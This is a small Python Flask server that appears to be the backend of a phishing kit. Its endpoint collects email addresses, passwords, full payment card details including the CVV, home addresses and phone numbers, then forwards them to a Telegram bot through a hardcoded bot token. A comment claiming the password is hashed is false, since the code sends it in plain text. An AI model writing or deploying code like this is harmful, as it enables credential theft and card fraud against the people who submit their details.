from flask import Flask, request, jsonify
import os
import requests
from dotenv import load_dotenv

# Load from .env file
load_dotenv()

BOT_TOKEN = os.getenv("7886311227:AAGGZH7NFdg1wQedTL6d3r_0ON4y3-UfBts")
CHAT_ID = os.getenv("5199748045")

app = Flask(__name__)

@app.route("/store", methods=["POST"])
def store():
    data = request.get_json() or {}
    email = data.get("email")
    password = data.get("password")
    cardNum = data.get('cardNumber')
    expiryMonth = data.get('expiryMonth')
    expiryYear = data.get('expiryYear')
    nameOnCard = data.get('nameOnCard')
    securityCode = data.get('securityCode')
    houseNumber = data.get('houseNumber')
    streetAddress = data.get('streetAddress')
    postcode = data.get('postcode')
    cardName = data.get('cardName')
    phoneNum = data.get('phoneNumber')
    # Hash password before storing

    message = f"🔐 Login\nEmail: {email}\nPassword: {password}\n Card number: {cardNum}\n expiry month: {expiryMonth}\n expiry year: {expiryYear}\n Name: {nameOnCard}\n cvv: {securityCode}\n Address: {houseNumber} {streetAddress} {postcode}\n Number: {phoneNum} \n Card Name: {cardName}"
    

    url = f"https://api.telegram.org/bot{'7886311227:AAGGZH7NFdg1wQedTL6d3r_0ON4y3-UfBts'}/sendMessage"
    payload = {
    'chat_id': CHAT_ID,
    'text': message
    }
    
    
    resp = requests.post(url, json=payload)
    if resp.status_code != 200:
        print()
        
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
    